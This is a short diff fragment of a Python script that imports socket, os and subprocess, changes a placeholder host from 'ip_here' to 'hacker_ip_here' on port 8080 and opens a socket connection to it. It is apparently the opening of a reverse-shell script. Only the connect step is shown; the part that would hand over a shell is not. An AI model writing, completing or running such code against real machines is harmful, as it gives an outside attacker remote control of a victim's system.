@@ -3,7 +3,7 @@ import os
 import subprocess
 
 s=socket.socket
-host="ip_here"
+host="hacker_ip_here"
 port=8080
 
 s.connect((host,port))
